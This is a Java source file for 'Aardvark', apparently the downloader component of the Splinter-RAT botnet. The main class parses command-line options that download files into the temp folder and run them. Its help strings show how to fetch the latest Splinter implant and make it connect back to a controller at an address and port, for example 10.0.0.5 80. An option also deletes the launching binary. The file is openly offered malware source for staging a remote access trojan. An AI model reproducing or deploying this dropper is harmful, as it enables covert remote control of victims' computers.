/**
 * @author Solomon Sonya
 */

package Main;

import java.io.File;
import java.util.Map;

import Downloader.Thread_Downloader;

public class Main 
{
	public static final String VERSION = "0.3";
	public static final String NICKNAME = "Aardvark";

	//public static final String updateLogSite = "https://github.com/splinterbotnet/Releases/blob/master/Logs/UpdateLog/UpdateLog.txt";
	public static final String updateLogSite_SPLINTER_GUI = "https://raw.githubusercontent.com/splinterbotnet/Releases/master/Logs/UpdateLog/UpdateLog.txt";
	public static final String updateLogSite_SPLINTER_IMPLANT = "https://raw.githubusercontent.com/splinterbotnet/Releases/master/Logs/UpdateLog/UpdateLog.txt";
	public static final String updateLogSite_AARDVARK = "https://raw.githubusercontent.com/splinterbotnet/Aardvark/master/Releases/Logs/UpdateLog/UpdateLog.txt";
	
	//SOLO, ADD DIRECT LINK TO AUTOUPDATER IF USER WISHES TO DOWNLOAD THE BINARY WITH CONSOLE OR WITHOUT
	
	public static final int action_Download_Most_Updated_Version_And_Execute_File = 0;
	public static final int action_Download_Most_Updated_Version_ONLY = 1;
	public static final int action_Check_Most_Updated_Version_ONLY = 2;
	public static final int action_Download_File_ONLY = 3;
	public static final int action_Download_And_Execute_File = 4;
	
	public static final String fileSeparator = System.getProperty("file.separator");
	
	public static final int action_if_file_exists_CREATE_NEW = 0;
	public static final int action_if_file_exists_TERMINATE_AND_OVERWRITE = 1;
	public static final int action_if_file_exists_DO_NOTHING = 2;
	
	public static volatile boolean delete_on_close = false;
	
	public static volatile String strLaunchPath = null; 
	public static volatile String strLaunchBinary = null;
	public static volatile String strLaunchDirectory = null;
	public static volatile String strTEMP = null;
	
	public static final String arg_UPDATE = "-update";
		public static final String arg_AARDVARK = "aardvark";
		public static final String arg_SPLINTER = "splinter";
		
	public static final String arg_CHECKNOW = "-checknow";
		
		
	public static final String arg_HELP = "-h";
	public static final String arg_VERSION = "-version";
	public static final String arg_DOWNLOAD_FROM_LOCATION_ONLY = "-d";	public static final String arg_DOWNLOAD_FROM_LOCATION_ONLY_ALT = "-download";
	public static final String arg_DOWNLOAD_FROM_LOCATION_AND_EXECUTE = "-dX";
	public static final String arg_DOWNLOAD_MOST_CURRENT_IMPLANT_AND_EXECUTE = "-i";
	
	
	public static final String help_DISPLAY_HELP = arg_HELP + "\t\t\tDisplay Help Options";
	public static final String help_BLANK_INPUT = "[NULL INPUT]" + "\t\tNo Input --> launch Splinter auto-update module";
	public static final String help_UPDATE_AARDVARK = arg_UPDATE + " " + arg_AARDVARK + "\tLaunch Aardvark auto-update module";
	public static final String help_UPDATE_SPLINTER = arg_UPDATE + " " + arg_SPLINTER + "\tLaunch Splinter GUI auto-update module";	
	public static final String help_CHECKNOW_AARDVARK = arg_CHECKNOW + " " + arg_AARDVARK + "\tCheck Most Updated Splinter Version";
	public static final String help_CHECKNOW_SPLINTER = arg_CHECKNOW + " " + arg_SPLINTER + "\tCheck Most Updated Aardvark Version";
	public static final String help_DOWNLOAD_FROM_LOCATION = arg_DOWNLOAD_FROM_LOCATION_ONLY + "\t\t\tDownload File Only!\n\t\t\t\tDownload file from location. Required params: \n\t\t\t\t[download address] [download file name on host]\n\n\t\t\t\te.g. " + arg_DOWNLOAD_FROM_LOCATION_ONLY + " www.!real.com/splinter.exe splinter.exe\n\n\t\t\t\tNOTE: Downloaded files are stored at %temp%";
	public static final String help_DOWNLOAD_FROM_LOCATION_AND_EXECUTE = arg_DOWNLOAD_FROM_LOCATION_AND_EXECUTE + "\t\t\tDownload File AND Execute\n\t\t\t\tDownload from location. Execute when complete.\n\t\t\t\tRequired params: \n\t\t\t\t[address] [file name onHost] <execution params>\n\n\t\t\t\tEX:To use Aardvark to download Splinter implant\n\t\t\t\tfrom www.!real.com/splinter.exe and connect to \n\t\t\t\t10.0.0.5:80.  It will look similar to the following:\n\n\t\t\t\t" + arg_DOWNLOAD_FROM_LOCATION_AND_EXECUTE + " www.!real.com/splinter.exe splinter.exe -i 10.0.0.5 80\n\n\t\t\t\tNOTE: Downloaded files are stored at %temp%";
	public static final String help_DOWNLOAD_MOST_CURRENT_IMPLANT_AND_EXECUTE = arg_DOWNLOAD_MOST_CURRENT_IMPLANT_AND_EXECUTE + "\t\t\tSplinter IMPLANT auto-update and execute\n\t\t\t\tUse this function to download the most current\n\t\t\t\tversion of Splinter IMPLANT and then specify\n\t\t\t\tparameters to have implant connect out to \n\t\t\t\tSplinter Controller (GUI).\n\n\t\t\t\tRequired parameters:\n\t\t\t\t[Splinter Controller address] [Port] <options>\n\n\t\t\t\tEX: Suppose you want Aardvark to download \n\t\t\t\tSplinter implant and connect to Controller\n\t\t\t\tat 10.0.0.5:80.\n\t\t\t\tThe command will look similar to the following:\n\n\t\t\t\t-i 10.0.0.5 80 \n\n\t\t\t\tNOTE: Downloaded files are stored at %temp%";
	
	public static final String help_VERSION = arg_VERSION + "\t\tDisplay Program Version Data";
	
	
	/**
	 * @param args
	 */
	public static void main(String[] args)	
	{
		System.out.println("\n*******************************************************************************");
		//System.out.println("* Splinter-RAT [Aardvark] vers 1.0 Developed by @Carpenter1010 - Solomon Sonya*");
		System.out.println("* Splinter-RAT [Aardvark] vrs " + VERSION + " Developed by @Carpenter1010 - Solomon Sonya *");
		System.out.println("* Additional resources can be found at www.github.com/splinterbotnet.com      *");
		System.out.println("*******************************************************************************");
		
		try
		{
			//
			//Map Temp Directory Path
			//
			Map systemMap = System.getenv();
			strTEMP = (String)systemMap.get("TEMP");
			
						
			//
			//determine initiation action
			//
			determineLaunchCommand(args);
			
			
			
			
		}
		catch(Exception e)
		{
			sop("Exception caught in main");
		}
		
		

	}
	
	public static boolean determineLaunchCommand(String[] args)
	{
		try
		{
			displayHelp();
									
			//
			//AUTO DOWNLOAD AND LAUNCH SPLINTE
			//
			if(args == null || args.length < 1)
			{
				//no arguments received, download most updated version
				//download and execute
				sop("Null input received --> Initiating Splinter auto-update module...\n");
				Thread_Downloader downloader = new Thread_Downloader(updateLogSite_SPLINTER_GUI, strTEMP, arg_SPLINTER, null, action_Download_Most_Updated_Version_And_Execute_File);
			}
			
			//
			//Display Help
			//
			else if(args[0].trim().equalsIgnoreCase(arg_HELP))
			{
				//do nothing and close, because we by default show the help options
				closeProgram();
			}
			
			//
			//Display Version Data
			//
			else if(args[0].trim().equalsIgnoreCase(arg_VERSION))
			{
				sop("Version Data --> Name: [" + NICKNAME + "] Version: [" + VERSION + "] Developed by Solomon Sonya");
				closeProgram();
			}
			
			//
			//AUTO UPDATE 
			//
			else if(args[0].trim().equalsIgnoreCase(arg_UPDATE))
			{
				//
				//AUTO UPDATE SPLINTER
				//
				if(args[1].trim().equalsIgnoreCase(arg_SPLINTER))
				{
					//DOWNLOAD AND LAUNCH SPLINTER
					sop("Initiating Splinter auto-update module...\n");
					Thread_Downloader downloader = new Thread_Downloader(updateLogSite_SPLINTER_GUI, strTEMP, arg_SPLINTER, null, action_Download_Most_Updated_Version_And_Execute_File);
				}
				
				//
				//AUTO UPDATE AARDVARK
				//
				else if(args[1].trim().equalsIgnoreCase(arg_AARDVARK))
				{
					//DOWNLOAD AARDVARK, NOTIFY USER
					sop("Initiating Aardvark auto-update module...\n");
					Thread_Downloader downloader = new Thread_Downloader(updateLogSite_AARDVARK, strTEMP, arg_AARDVARK, null, action_Download_Most_Updated_Version_ONLY);
				}
				
				else
				{
					sop("Invalid input entered. You must specify correct module for auto-update command");
					closeProgram();
				}
				
			}
			
			//
			//CHECK ON MOST RECENT SPLINTER / AARDVARK UPDATE VERSIONS
			//
			else if(args[0].trim().equalsIgnoreCase(arg_CHECKNOW))
			{
				//
				//CHECK SPLINTER MOST RECENT VERSION
				//
				if(args[1].trim().equalsIgnoreCase(arg_SPLINTER))
				{
					//CHECK SPLINTER UPDATE VERSION
					sop("Initiating Splinter check-update module...\n");
					Thread_Downloader downloader = new Thread_Downloader(updateLogSite_SPLINTER_GUI, strTEMP, arg_SPLINTER, null, action_Check_Most_Updated_Version_ONLY);
				}
				
				//
				//CHECK AARDVARK MOST RECENT VERSION
				//
				else if(args[1].trim().equalsIgnoreCase(arg_AARDVARK))
				{
					//CHECK SPLINTER UPDATE VERSION
					sop("Initiating Aardvark check-update module...\n");
					Thread_Downloader downloader = new Thread_Downloader(updateLogSite_AARDVARK, strTEMP, arg_AARDVARK, null, action_Check_Most_Updated_Version_ONLY);
				}
				
				else
				{
					sop("Invalid input entered. You must specify correct module for check-update command");
					closeProgram();
				}
				
			}
			
			//
			//DOWNLOAD FILE ONLY!
			//
			else if(args[0].trim().equalsIgnoreCase(arg_DOWNLOAD_FROM_LOCATION_ONLY) || args[0].trim().equalsIgnoreCase(arg_DOWNLOAD_FROM_LOCATION_ONLY_ALT))
			{
				String download_link = args[1].trim();
				String file_name_when_downloaded_on_host = args[2].trim();
				
				//Launch downloader only
				sop("Initiating Aardvark download-file-only module...\n");
				Thread_Downloader downloader = new Thread_Downloader(download_link, strTEMP, file_name_when_downloaded_on_host, null, action_Download_File_ONLY);
			}
			
			//
			//DOWNLOAD AND EXECUTE FILE
			//
			else if(args[0].trim().equalsIgnoreCase(arg_DOWNLOAD_FROM_LOCATION_AND_EXECUTE))
			{
				String download_link = args[1].trim();
				String file_name_when_downloaded_on_host = args[2].trim();
				String params = "";
				//compile remaining arguments
				for(int i = 3; i < args.length; i++)
				{					
					params = params + args[i].trim() + " ";
				}
												
				//Download and execute file when complete
				sop("Initiating Aardvark download-and_execute file module...\n");
				Thread_Downloader downloader = new Thread_Downloader(download_link, strTEMP, file_name_when_downloaded_on_host, params, action_Download_And_Execute_File);
			}
			
			//
			//AUTO-UPDATE SPLINTER IMPLANT, EXECUTE TO CONNECT BACK TO CONTROLLER			
			//
			else if(args[0].trim().equalsIgnoreCase(arg_DOWNLOAD_MOST_CURRENT_IMPLANT_AND_EXECUTE))
			{				
				String controller_address =  args[1].trim();
				String port =  args[2].trim();
				
				String params = "-i " + controller_address + " " + port;
				
				//compile remaining arguments
				for(int i = 3; i < args.length; i++)
				{					
					params = params + args[i].trim() + " ";
				}
												
				//Download and execute file when complete
				sop("Initiating Splinter Implant auto-update module to connect out to controller...\n");
				Thread_Downloader downloader = new Thread_Downloader(updateLogSite_SPLINTER_IMPLANT, strTEMP, arg_SPLINTER, params, action_Download_Most_Updated_Version_And_Execute_File);
			}
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
				
			else
			{
				throw new Exception("Invalid input received!");
			}
			return true;
		}
		catch(Exception e)
		{
			sop("INVALID INPUT RECEIVED!");
			
			displayHelp();
			
			//sop("Program Terminated.");
			closeProgram();
		}
		
		
		
		return false;
	}
	
	public static void displayHelp()
	{
		try
		{
			sop("\nOPTIONS:");
			sop("\n\t" + help_DISPLAY_HELP);
			sop("\n\t" + help_VERSION);
			sop("\n\t" + help_BLANK_INPUT);
			sop("\n\t" + help_UPDATE_AARDVARK);
			sop("\n\t" + help_UPDATE_SPLINTER);
			sop("\n\t" + help_CHECKNOW_SPLINTER);
			sop("\n\t" + help_CHECKNOW_AARDVARK);
			sop("\n\t" + help_DOWNLOAD_FROM_LOCATION);
			sop("\n\t" + help_DOWNLOAD_FROM_LOCATION_AND_EXECUTE);
			sop("\n\t" + help_DOWNLOAD_MOST_CURRENT_IMPLANT_AND_EXECUTE);
			//sop("\n\t" + );
			//sop("\n\t" + );
			//sop("\n\t" + );
			//sop("\n\t" + );
			//sop("\n\t" + );
			//sop("\n\t" + );
			//sop("\n\t" + );
			//sop("\n\t" + );
			//sop("\n\t" + );
			
			
			
			sop("\n\n");
			
			//System.exit(0);
			
		}
		catch(Exception e)
		{
			sop("INVALID INPUT RECEIVED!!");
			closeProgram();
		}
		
		
	}
	
	public static void sp(String out)
	{
		try
		{
			System.out.print(out);
		}catch(Exception e){}
	}
	
	public static void closeProgram()
	{
		try
		{
			if(delete_on_close && strLaunchPath != null && !strLaunchPath.trim().equals("") && strLaunchBinary != null && !strLaunchBinary.trim().equals("") && strLaunchDirectory != null && !strLaunchDirectory.trim().equals("") )
			{
				File launchBinary = new File(strLaunchPath);
				launchBinary.deleteOnExit();
			}
			
			sop("\nProgram Terminated.");
			
			System.exit(0);
			
			
		}
		catch(Exception e){Main.sop("EXCEPTION!!!!!!");}
		
		
	}
	
	public static void sop(String out)
	{
		try
		{
			System.out.println(out);
		}catch(Exception e){}
	}

	public static void eop(String myClassName, String mtdName, Exception e, boolean printStackTrace)
	{
		try
		{
			//String errorMsg = "Exception caught in " + mtdName + " mtd in " + myClassName;
			String errorMsg = "Error Encountered in " + mtdName + " mtd in " + myClassName;
			
			if(e != null)
			{
				try
				{
					String newErrorMsg = errorMsg + " Error Msg: " + e.getLocalizedMessage();
					
					//no errors, reset back
					errorMsg = newErrorMsg;
				}
				catch(Exception ee)
				{
					//do n/t, original error msg remains
				}
			}
			
			System.out.println(errorMsg);
			
			if(printStackTrace && e != null)
			{
				e.printStackTrace(System.out);
			}
			
		}catch(Exception eee){}
	}
	
}
